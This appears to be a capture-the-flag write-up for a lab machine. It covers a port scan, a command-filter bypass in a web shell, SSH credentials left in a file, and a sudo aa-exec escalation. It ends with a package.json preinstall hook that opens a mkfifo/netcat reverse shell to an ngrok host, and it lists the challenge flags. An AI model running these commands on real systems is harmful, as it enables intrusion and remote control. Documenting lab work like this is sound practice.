      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack


- I scanned with Rustcan and discovered 2 open ports, port 80 `http` and port 22 `ssh` respectively.

- The site's source code contains this hint to check `robots.txt` file

![image](https://github.com/user-attachments/assets/e6ee4bf9-940e-4540-b413-41652c4611b3)

- The robots.txt file disallow crawling of files `syrup.jpeg` and `kaya.txt`
![image](https://github.com/user-attachments/assets/88594d64-5b2b-462b-a829-1e020033be19)

- Kaya.txt leads us to `dev_shell.php` page where we can execute shell commands.Although the shell code filters shell commands,checking the source code presents our first flag
![image](https://github.com/user-attachments/assets/8866ab4b-d112-48f2-bc4e-614e25a0320f)

- Flag-:``` BICCTF{Bl@ck_C@t_P1r@tes}```

### SSH ACCESS

- Running `l\s` to bypass the filter reveals a txt file.

![image](https://github.com/user-attachments/assets/3affc173-bb7a-48c5-9bff-38b0b99222a3)

- The txt file contains ssh credentials for the user `kuro`

- SSH Access
![image](https://github.com/user-attachments/assets/da974b06-bebb-4c72-97b5-073ca20e3692)

- `/home/kuro/Desktop/flag2.txt` contains the second flag
![image](https://github.com/user-attachments/assets/6c24be62-2334-4315-91da-8c8aba7c9c8b)

- Flag2-:```BICCTF{Nukia$hi}```

### User Usopp
- Running `sudo -l` as user `kuro` shows we can run binary `aa-exec` as user `usopp` without password.

![image](https://github.com/user-attachments/assets/99f8b741-280a-4ef9-b763-907ba73b6b59)

- I got this payload from gtfobins `aa-exec /bin/sh -p`, run with `aa-exec /bin/bash -p` to get a bash shell.Now, we have access to user `Usopp`
   Payload-:```sudo -u usopp aa-exec /bin/bash -p```

![image](https://github.com/user-attachments/assets/9ea1e3f3-d4ab-41e0-ac82-ff34291e62bd)

- The third flag is located in `/home/usopp/Desktop/flag3.txt`

![image](https://github.com/user-attachments/assets/d677d4c6-504d-438f-a84e-1ea259b792ab)

- Flag3-:```BICCTF{P@ch1nko}```
  
### Accessing User `node` with `npm install` cronjob

- This hint in the `Document` directory reveals a nodejob that run every 2mins

![image](https://github.com/user-attachments/assets/f862d4c6-0403-4d1e-b485-8ffbd4ebdcc2)

- We can abuse the package-lock.json file to spawn a reverse shell by creating a new one since the present one cannot be edited.

      {
        "name": ".nodeitems",
        "scripts": {
                 "preinstall": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 5.tcp.eu.ngrok.io 11222 >/tmp/f"
             }
      }
